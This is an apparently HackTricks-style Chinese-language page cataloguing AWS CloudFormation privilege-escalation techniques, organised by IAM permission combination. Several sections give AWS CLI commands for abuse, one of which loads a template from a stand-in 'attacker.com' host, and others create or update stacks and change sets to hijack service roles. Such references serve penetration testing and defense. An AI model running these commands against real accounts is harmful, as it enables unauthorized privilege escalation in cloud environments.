# AWS - Cloudformation权限提升

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## cloudformation

有关cloudformation的更多信息，请查看：

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

拥有这些权限的攻击者可以通过创建一个自定义模板的**CloudFormation堆栈**，该模板托管在他们的服务器上，来**以指定角色的权限执行操作，从而升级权限**：
```bash
aws cloudformation create-stack --stack-name <stack-name> \
--template-url http://attacker.com/attackers.template \
--role-arn <arn-role>
```
在以下页面中，您将看到一个**利用示例**，其中包含额外权限**`cloudformation:DescribeStacks`**：

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**潜在影响：** 特定的cloudformation服务角色权限提升。

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

在这种情况下，您可以**滥用现有的cloudformation堆栈**来更新它，并像之前的情景一样升级权限：
```bash
aws cloudformation update-stack \
--stack-name privesc \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
--capabilities CAPABILITY_IAM \
--region eu-west-1
```
### `cloudformation:SetStackPolicy` | `cloudformation:UpdateStack`

可以使用`cloudformation:SetStackPolicy`权限来**为堆栈授予`UpdateStack`权限**并执行攻击。

**潜在影响：**提升至指定的cloudformation服务角色。

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

如果您拥有此权限但**没有`iam:PassRole`**，您仍然可以**更新使用的堆栈**并滥用它们已经附加的**IAM角色**。查看前一节的利用示例（只是不要在更新中指定任何角色）。

可以使用`cloudformation:SetStackPolicy`权限来**为堆栈授予`UpdateStack`权限**并执行攻击。

**潜在影响：**提升至已附加的cloudformation服务角色。

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

具有**传递角色和创建/执行ChangeSet**权限的攻击者可以**创建/更新新的cloudformation堆栈并滥用cloudformation服务角色**，就像使用CreateStack或UpdateStack一样。

以下利用是使用**ChangeSet权限**创建堆栈的**变体**[**CreateStack one**](./#iam-passrole-cloudformation-createstack)。
```bash
aws cloudformation create-change-set \
--stack-name privesc \
--change-set-name privesc \
--change-set-type CREATE \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::947247140022:role/CloudFormationAdmin \
--capabilities CAPABILITY_IAM \
--region eu-west-1

echo "Waiting 2 mins to change the stack"
sleep 120

aws cloudformation execute-change-set \
--change-set-name privesc \
--stack-name privesc \
--region eu-west-1

echo "Waiting 2 mins to execute the stack"
sleep 120

aws cloudformation describe-stacks \
--stack-name privesc \
--region eu-west-1
```
`cloudformation:SetStackPolicy` 权限可用于**为堆栈授予 `ChangeSet` 权限**并执行攻击。

**潜在影响：** 特权升级到 cloudformation 服务角色。

### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

这类似于之前的方法，但不需要传递**IAM角色**，因此您可以**滥用已附加的角色**，只需修改参数：
```
--change-set-type UPDATE
```
**潜在影响:** 特权升级至已附加的CloudFormation服务角色。

### `iam:PassRole`,(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

攻击者可以利用这些权限创建/更新StackSets，以滥用任意的CloudFormation角色。

**潜在影响:** 特权升级至CloudFormation服务角色。

### `cloudformation:UpdateStackSet`

攻击者可以滥用此权限，无需`PassRole`权限即可更新StackSets，以滥用已附加的CloudFormation角色。

**潜在影响:** 特权升级至已附加的CloudFormation角色。

## 参考资料

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
